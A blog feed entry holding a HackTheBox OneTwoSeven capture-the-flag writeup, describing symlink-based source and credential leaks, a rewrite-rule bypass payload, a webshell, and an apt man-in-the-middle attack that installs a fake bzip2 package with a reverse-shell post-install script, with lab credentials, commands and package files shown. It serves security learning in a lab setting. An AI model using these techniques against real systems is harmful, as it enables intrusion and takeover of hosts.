// API callback
random_posts({"version":"1.0","encoding":"UTF-8","feed":{"xmlns":"http://www.w3.org/2005/Atom","xmlns$openSearch":"http://a9.com/-/spec/opensearchrss/1.0/","xmlns$blogger":"http://schemas.google.com/blogger/2008","xmlns$georss":"http://www.georss.org/georss","xmlns$gd":"http://schemas.google.com/g/2005","xmlns$thr":"http://purl.org/syndication/thread/1.0","id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982"},"updated":{"$t":"2021-11-30T16:35:33.972-08:00"},"title":{"type":"text","$t":"Will's Root"},"subtitle":{"type":"html","$t":"Pentesting, CTFs, and Writeups"},"link":[{"rel":"http://schemas.google.com/g/2005#feed","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/posts\/default"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=47\u0026max-results=1"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/"},{"rel":"hub","href":"http://pubsubhubbub.appspot.com/"},{"rel":"previous","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=46\u0026max-results=1"},{"rel":"next","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=48\u0026max-results=1"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"generator":{"version":"7.00","uri":"http://www.blogger.com","$t":"Blogger"},"openSearch$totalResults":{"$t":"54"},"openSearch$startIndex":{"$t":"47"},"openSearch$itemsPerPage":{"$t":"1"},"entry":[{"id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982.post-11389599407072229"},"published":{"$t":"2019-08-30T21:42:00.000-07:00"},"updated":{"$t":"2019-08-31T10:10:44.174-07:00"},"title":{"type":"text","$t":"HackTheBox OneTwoSeven Writeup"},"content":{"type":"html","$t":"Here's my writeup (and basically notes for myself in the future) for the OneTwoSeven machine, which had one of the most memorable rooting scenarios.\u0026nbsp; More of these will be posted as challenges\/boxes get retired.\u003Cbr \/\u003E\u003Cdiv class=\"separator\" style=\"clear: both; text-align: center;\"\u003E\u003Ca href=\"https:\/\/1.bp.blogspot.com\/-rtFXdoTgHoA\/XWn1o58x5oI\/AAAAAAAABjQ\/nj2oxameV-olL0csqviCR6lcBCr2SwDUgCEwYBhgL\/s1600\/Capture.PNG\" imageanchor=\"1\" style=\"margin-left: 1em; margin-right: 1em;\"\u003E\u003Cimg border=\"0\" data-original-height=\"150\" data-original-width=\"431\" height=\"138\" src=\"https:\/\/1.bp.blogspot.com\/-rtFXdoTgHoA\/XWn1o58x5oI\/AAAAAAAABjQ\/nj2oxameV-olL0csqviCR6lcBCr2SwDUgCEwYBhgL\/s400\/Capture.PNG\" width=\"400\" \/\u003E\u003C\/a\u003E\u003C\/div\u003E\u003Cbr \/\u003EOn our initial nmap scan, it turns out only ssh (22) and http (80) are available. From the webpage, we can receive sftp credentials, which we can use on port 22.\u0026nbsp; We also get our own webpage based on our account; after noticing that I can create and delete files from sftp, I realized that I control my own webpage.\u0026nbsp; Directly dropping in php files and then calling them from a new malicious webpage I made failed.\u0026nbsp; However, I noticed that I could use symbolic leaks to perhaps extract credentials; after all, it treats symbolically linked (I used soft links) files as text files.\u0026nbsp; Using this technique, I can extract other information and even valuable source code.\u0026nbsp; When I symbolically linked \/var\/www to a new folder in our web folder,\u0026nbsp; I noticed a vim swap file.\u0026nbsp; Inside, I found the following creds:\u0026nbsp;ots-admin:Homesweethome1\u003Cbr \/\u003E\u003Cbr \/\u003EHowever, those creds don't work yet.\u0026nbsp; Eventually, I symbolically linked index.php from web root (\/var\/www\/html) and found a reference to signup.php and the following references to adminlink, following the condition if the IP is 127.0.0.1 or 104.24.0.54 (portal is on port 60080 according to source).\u003Cbr \/\u003EAdditionally, the following was in signup.php:\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Efunction username() { $ip = $_SERVER['REMOTE_ADDR']; return \"ots-\" . substr(str_replace('=','',base64_encode(substr(md5($ip),0,8))),3); }\u003Cbr \/\u003Efunction password() { $ip = $_SERVER['REMOTE_ADDR']; return substr(md5($ip),0,8); }\u003C\/div\u003E\u003Cbr \/\u003EMaking this into its own php script locally, I tried testing it with 127.0.0.1 as the IP to find the creds and username (our earlier creds and username came from this too).\u0026nbsp; Here's what I received:ots-yODc2NGQ:f528764d\u003Cbr \/\u003E\u003Cbr \/\u003EUsing these credentials on port 22, I managed to own user.\u003Cbr \/\u003E\u003Cbr \/\u003ENow, for root, I first attempted to visit the admin page, which can only be accessed from those specific IPs.\u0026nbsp; I used ssh tunneling (but sftp kept getting in the way until I disabled shell spawning and any command execution in my command):\u0026nbsp;ssh -NT -L 60080:127.0.0.1:60080 ots-yODc2NGQ@onetwoseven.htb\u003Cbr \/\u003E\u003Cbr \/\u003EWe manage to enter in with ots-admin credentials.\u0026nbsp; Interestingly, the submit button is disabled, but you can easily enable it with classic inspect element.\u0026nbsp; However, upload does not work by default and there are rewrite rules.\u0026nbsp; Using the download one, I managed to download the source of ots-man-addon.php.\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Esession_start(); if (!isset ($_SESSION['username'])) { header(\"Location: \/login.php\"); }; if ( strpos($_SERVER['REQUEST_URI'], '\/addons\/') !== false ) { die(); };\u003Cbr \/\u003E# OneTwoSeven Admin Plugin\u003Cbr \/\u003E# OTS Addon Manager\u003Cbr \/\u003Eswitch (true) {\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E# Upload addon to addons folder.\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ecase preg_match('\/\\\/addon-upload.php\/',$_SERVER['REQUEST_URI']):\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eif(isset($_FILES['addon'])){\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E$errors= array();\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E$file_name = basename($_FILES['addon']['name']);\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E$file_size =$_FILES['addon']['size'];\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E$file_tmp =$_FILES['addon']['tmp_name'];\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003Eif($file_size \u0026gt; 20000){\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003E$errors[]='Module too big for addon manager. Please upload manually.';\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E}\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003Eif(empty($errors)==true) {\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Emove_uploaded_file($file_tmp,$file_name);\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eheader(\"Location: \/menu.php\");\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eheader(\"Content-Type: text\/plain\");\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eecho \"File uploaded successfull.y\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E} else {\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eheader(\"Location: \/menu.php\");\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eheader(\"Content-Type: text\/plain\");\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eecho \"Error uploading the file: \";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eprint_r($errors);\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E}\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003E}\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Ebreak;\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E# Download addon from addons folder.\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ecase preg_match('\/\\\/addon-download.php\/',$_SERVER['REQUEST_URI']):\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eif ($_GET['addon']) {\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E$addon_file = basename($_GET['addon']);\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003Eif ( file_exists($addon_file) ) {\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eheader(\"Content-Disposition: attachment; filename=$addon_file\");\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eheader(\"Content-Type: text\/plain\");\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Ereadfile($addon_file);\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E} else {\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Eheader($_SERVER[\"SERVER_PROTOCOL\"].\" 404 Not Found\", true, 404);\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E    \u003C\/span\u003Edie();\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E   \u003C\/span\u003E}\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003E}\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Ebreak;\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Edefault:\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eecho \"The addon manager must not be executed directly but only via\u0026lt;br\u0026gt;\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eecho \"the provided RewriteRules:\u0026lt;br\u0026gt;\u0026lt;hr\u0026gt;\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eecho \"RewriteEngine On\u0026lt;br\u0026gt;\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eecho \"RewriteRule ^addon-upload.php\u0026nbsp; \u0026nbsp;addons\/ots-man-addon.php [L]\u0026lt;br\u0026gt;\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eecho \"RewriteRule ^addon-download.php addons\/ots-man-addon.php [L]\u0026lt;br\u0026gt;\u0026lt;hr\u0026gt;\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eecho \"By commenting individual RewriteRules you can disable single\u0026lt;br\u0026gt;\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eecho \"features (i.e. for security reasons)\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Eecho \"\u0026lt;font size='-2'\u0026gt;Please note: Disabling a feature through htaccess leads to 404 errors for now.\u0026lt;\/font\u0026gt;\";\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E  \u003C\/span\u003Ebreak;\u003Cbr \/\u003E}\u003C\/div\u003EAh, we have to beat a few string checks check above.\u0026nbsp; This was my final payload (sent with Burp):\u0026nbsp;addon-download.php?blah=\/addon-upload.php\u003Cbr \/\u003E\u003Cbr \/\u003EUsing the pentest monkey webshell, I managed to pop a shell.\u0026nbsp; Looking at the output of sudo -l in basic enumeration, I noticed that I can run sudo apt-get update and sudo apt-get upgrade and set an HTTP proxy.\u0026nbsp; Sounds like a MITM attack!\u0026nbsp; Read \u003Ca href=\"https:\/\/versprite.com\/blog\/apt-mitm-package-injection\/\" target=\"_blank\"\u003Ethis\u003C\/a\u003E article to learn more.\u0026nbsp; I set the proxy to point to a burp listener on my end (with the listener off) and then in my \/etc\/hosts file, added onetwoseven.htb as 127.0.0.1.\u0026nbsp; Others used different configurations to hijack the connection.\u003Cbr \/\u003E\u003Cbr \/\u003EThen, I looked through the installed packages on the box and decided to target bzip2.\u0026nbsp; In my malicious package, I had to make the dependencies and version number similar and slightly higher (for the latter).\u0026nbsp; Then, in a malicious post install script, I added a reverse shell, a bind shell, and a cat command to dump the root flag into tmp.\u0026nbsp; This was just for precautions because making the package took so long.\u0026nbsp; As for setting up the malicious server on our side for port 80, here is what I did:\u003Cbr \/\u003E\u003Cbr \/\u003EGo to \/var\/lib\/apt\/lists to carefully check the formatting when needed.\u003Cbr \/\u003E\u003Cbr \/\u003EI basically followed the article for the rest of the setup.\u0026nbsp; My package file looked like this:\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003EPackage: bzip2\u003Cbr \/\u003EVersion: 1.0.6-8.2\u003Cbr \/\u003EInstalled-Size: 184\u003Cbr \/\u003EMaintainer: Anibal Monsalve Salazar \u0026lt;anibal@debian.org\u0026gt;\u003Cbr \/\u003EArchitecture: amd64\u003Cbr \/\u003EReplaces: libbz2 (\u0026lt;\u0026lt; 0.9.5d-3)\u003Cbr \/\u003EDepends: libbz2-1.0 (= 1.0.6-8.1), libc6 (\u0026gt;= 2.14)\u003Cbr \/\u003EHomepage: http:\/\/\/packages.onetwoseven.htb\u003Cbr \/\u003EDescription: high-quality block-sorting file compressor - utilities\u003Cbr \/\u003EDescription-md5: 26e9d96b611ed3cf741ba7007fd4f233\u003Cbr \/\u003ESuggests: bzip2-doc\u003Cbr \/\u003EMulti-Arch: foreign\u003Cbr \/\u003ETag: implemented-in::c, interface::commandline, role::program,\u003Cbr \/\u003E\u0026nbsp;scope::utility, use::compressing, works-with-format::TODO,\u003Cbr \/\u003E\u0026nbsp;works-with::archive, works-with::file\u003Cbr \/\u003ESection: utils\u003Cbr \/\u003EPriority: standard\u003Cbr \/\u003EFilename: \/bzip2_1.0.6-8.2.deb\u003Cbr \/\u003ESize: 52424\u003Cbr \/\u003ESHA1: 8b1be1e08bc7ee54dfe6325f68d90d50d958ab94\u003Cbr \/\u003EMD5sum: 34a92f13d33e6d5a225f0e411a9d700f\u003Cbr \/\u003ESHA256: f55a84d3eac72958cc31c7f19c80aadd1c7cf6783c85aa355590ade261ea5b13\u003Cbr \/\u003EDescription: high-quality block-sorting file compressor - utilities\u003Cbr \/\u003E\u0026nbsp;bzip2 is a freely available, patent free, high-quality data compressor.\u003Cbr \/\u003E\u0026nbsp;It typically compresses files to within 10% to 15% of the best available\u003Cbr \/\u003E\u0026nbsp;techniques, whilst being around twice as fast at compression and six\u003Cbr \/\u003E\u0026nbsp;times faster at decompression.\u003Cbr \/\u003E\u0026nbsp;.\u003Cbr \/\u003E\u0026nbsp;bzip2 compresses files using the Burrows-Wheeler block-sorting text\u003Cbr \/\u003E\u0026nbsp;compression algorithm, and Huffman coding.\u0026nbsp; Compression is generally\u003Cbr \/\u003E\u0026nbsp;considerably better than that achieved by more conventional\u003Cbr \/\u003E\u0026nbsp;LZ77\/LZ78-based compressors, and approaches the performance of the PPM\u003Cbr \/\u003E\u0026nbsp;family of statistical compressors.\u003Cbr \/\u003E\u0026nbsp;.\u003Cbr \/\u003E\u0026nbsp;The archive file format of bzip2 (.bz2) is incompatible with that of its\u003Cbr \/\u003E\u0026nbsp;predecessor, bzip (.bz).\u003Cbr \/\u003EHomepage: http:\/\/www.bzip.org\/\u003C\/div\u003E\u003Cbr \/\u003EMy releases file looked like this:\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003EOrigin: Devuan\u003Cbr \/\u003ELabel: Devuan\u003Cbr \/\u003ESuite: Stable\u003Cbr \/\u003EVersion: 1.0.6-8.2\u003Cbr \/\u003ECodename: ascii\u003Cbr \/\u003EDate: Mon, 21 Apr 2019 07:57:13 UTC\u003Cbr \/\u003EArchitectures: amd64\u003Cbr \/\u003EMD5Sum:\u003Cbr \/\u003E\u0026nbsp;3d7bbfc40028200d27fb6fc0f51a94d8\u0026nbsp; main\/binary-amd64\/Packages\u003Cbr \/\u003E\u0026nbsp;943dba7597825e10c8598835e0324a3f\u0026nbsp; main\/binary-amd64\/Packages.gz\u003Cbr \/\u003ESHA1:\u003Cbr \/\u003E\u0026nbsp;97d6e52da5befcd8a0b082bd9ab48195d00109d8 main\/binary-amd64\/Packages\u003Cbr \/\u003E\u0026nbsp;ef45d09148383a24aaeba1b8ba246b9c50ad5416 main\/binary-amd64\/Packages.gz\u003Cbr \/\u003ESHA256:\u003Cbr \/\u003E\u0026nbsp;c764a146c77ef8bbd7978fa5841fcd2243477eb9f79dc84bac2bc7f7662aab11 main\/binary-amd64\/Packages\u003Cbr \/\u003E\u0026nbsp;cb444bd2cbd541835c81cbdeaef1594f64dc58d1c66afa97ff1914193526dc28 main\/binary-amd64\/Packages.gz\u003C\/div\u003E\u003Cbr \/\u003EThen, from a few failed attempts, I slowly figured out the correct directory structure.\u0026nbsp; Devuan was the first directory, bzip package was contained in a pool folder, and then under dists\/ascii, I held the Release and Release.gz files.\u0026nbsp; Within here, I had a binary-amd64 folder under main, and the Packages and Packages.gz files in there.\u0026nbsp; I also held all these files in the same the malicious server root too.\u0026nbsp; Now, I managed to get a shell back, and this box was owned!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/11389599407072229\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"https:\/\/www.willsroot.io\/2019\/08\/hackthebox-onetwoseven-writeup.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/11389599407072229"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/11389599407072229"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/2019\/08\/hackthebox-onetwoseven-writeup.html","title":"HackTheBox OneTwoSeven Writeup"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"media$thumbnail":{"xmlns$media":"http://search.yahoo.com/mrss/","url":"https:\/\/1.bp.blogspot.com\/-rtFXdoTgHoA\/XWn1o58x5oI\/AAAAAAAABjQ\/nj2oxameV-olL0csqviCR6lcBCr2SwDUgCEwYBhgL\/s72-c\/Capture.PNG","height":"72","width":"72"},"thr$total":{"$t":"0"}}]}});